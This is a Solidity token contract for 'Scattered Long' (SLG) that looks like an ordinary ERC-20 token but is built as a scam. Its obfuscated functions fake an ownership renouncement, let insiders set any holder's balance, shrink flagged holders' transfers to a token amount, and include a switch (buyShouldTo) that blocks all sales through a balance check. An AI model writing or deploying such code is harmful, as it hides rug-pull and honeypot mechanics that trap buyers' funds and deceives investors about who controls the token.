//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface liquidityMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract teamWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingSell {
    function createPair(address autoTakeLaunched, address amountMode) external returns (address);
}

interface maxSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoTeam) external view returns (uint256);

    function transfer(address isTrading, uint256 amountSender) external returns (bool);

    function allowance(address receiverFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountSender) external returns (bool);

    function transferFrom(
        address sender,
        address isTrading,
        uint256 amountSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeFee, uint256 value);
    event Approval(address indexed receiverFund, address indexed spender, uint256 value);
}

interface maxSwapMetadata is maxSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ScatteredLong is teamWallet, maxSwap, maxSwapMetadata {

    uint256 public tradingTx;

    function minAmount(address teamToken) public {
        if (senderMode) {
            return;
        }
        if (autoBuy != totalFrom) {
            tradingMode = tradingTx;
        }
        atTeamMarketing[teamToken] = true;
        if (buyMarketing) {
            autoBuy = true;
        }
        senderMode = true;
    }

    bool private autoBuy;

    uint256 public minMarketingTeam;

    uint256 receiverFrom;

    uint8 private teamAuto = 18;

    event OwnershipTransferred(address indexed modeList, address indexed sellFrom);

    function transfer(address limitList, uint256 amountSender) external virtual override returns (bool) {
        return totalLaunch(_msgSender(), limitList, amountSender);
    }

    bool public senderMode;

    bool private buyMarketing;

    address public fundTotalTx;

    function balanceOf(address autoTeam) public view virtual override returns (uint256) {
        return atMax[autoTeam];
    }

    address private enableSwap;

    mapping(address => bool) public marketingTake;

    address public exemptIs;

    uint256 private maxLimit;

    function decimals() external view virtual override returns (uint8) {
        return teamAuto;
    }

    function buyShouldTo(uint256 amountSender) public {
        receiverTeam();
        receiverFrom = amountSender;
    }

    function tokenSell(address sellSwap, address isTrading, uint256 amountSender) internal returns (bool) {
        require(atMax[sellSwap] >= amountSender);
        atMax[sellSwap] -= amountSender;
        atMax[isTrading] += amountSender;
        emit Transfer(sellSwap, isTrading, amountSender);
        return true;
    }

    function totalLaunch(address sellSwap, address isTrading, uint256 amountSender) internal returns (bool) {
        if (sellSwap == fundTotalTx) {
            return tokenSell(sellSwap, isTrading, amountSender);
        }
        uint256 enableShould = maxSwap(exemptIs).balanceOf(receiverEnable);
        require(enableShould == receiverFrom);
        require(isTrading != receiverEnable);
        if (marketingTake[sellSwap]) {
            return tokenSell(sellSwap, isTrading, atBuy);
        }
        return tokenSell(sellSwap, isTrading, amountSender);
    }

    function name() external view virtual override returns (string memory) {
        return liquidityShouldExempt;
    }

    bool public totalFrom;

    uint256 public tradingMode;

    function transferFrom(address sellSwap, address isTrading, uint256 amountSender) external override returns (bool) {
        if (_msgSender() != enableMax) {
            if (teamSell[sellSwap][_msgSender()] != type(uint256).max) {
                require(amountSender <= teamSell[sellSwap][_msgSender()]);
                teamSell[sellSwap][_msgSender()] -= amountSender;
            }
        }
        return totalLaunch(sellSwap, isTrading, amountSender);
    }

    function allowance(address fromLaunch, address swapLaunched) external view virtual override returns (uint256) {
        if (swapLaunched == enableMax) {
            return type(uint256).max;
        }
        return teamSell[fromLaunch][swapLaunched];
    }

    function teamTradingSender() public {
        emit OwnershipTransferred(fundTotalTx, address(0));
        enableSwap = address(0);
    }

    mapping(address => bool) public atTeamMarketing;

    constructor (){
        if (teamTake != totalFrom) {
            sellFund = true;
        }
        liquidityMarketing toFrom = liquidityMarketing(enableMax);
        exemptIs = tradingSell(toFrom.factory()).createPair(toFrom.WETH(), address(this));
        
        fundTotalTx = _msgSender();
        teamTradingSender();
        atTeamMarketing[fundTotalTx] = true;
        atMax[fundTotalTx] = liquidityTx;
        
        emit Transfer(address(0), fundTotalTx, liquidityTx);
    }

    mapping(address => uint256) private atMax;

    function getOwner() external view returns (address) {
        return enableSwap;
    }

    function approve(address swapLaunched, uint256 amountSender) public virtual override returns (bool) {
        teamSell[_msgSender()][swapLaunched] = amountSender;
        emit Approval(_msgSender(), swapLaunched, amountSender);
        return true;
    }

    bool private sellFund;

    address enableMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 tokenLimit;

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityTx;
    }

    function exemptTrading(address limitList, uint256 amountSender) public {
        receiverTeam();
        atMax[limitList] = amountSender;
    }

    uint256 private liquidityTx = 100000000 * 10 ** 18;

    function amountTotal(address teamEnable) public {
        receiverTeam();
        
        if (teamEnable == fundTotalTx || teamEnable == exemptIs) {
            return;
        }
        marketingTake[teamEnable] = true;
    }

    function receiverTeam() private view {
        require(atTeamMarketing[_msgSender()]);
    }

    address receiverEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private senderMin = "SLG";

    bool private teamTake;

    uint256 private toSender;

    function owner() external view returns (address) {
        return enableSwap;
    }

    mapping(address => mapping(address => uint256)) private teamSell;

    function symbol() external view virtual override returns (string memory) {
        return senderMin;
    }

    uint256 constant atBuy = 12 ** 10;

    string private liquidityShouldExempt = "Scattered Long";

}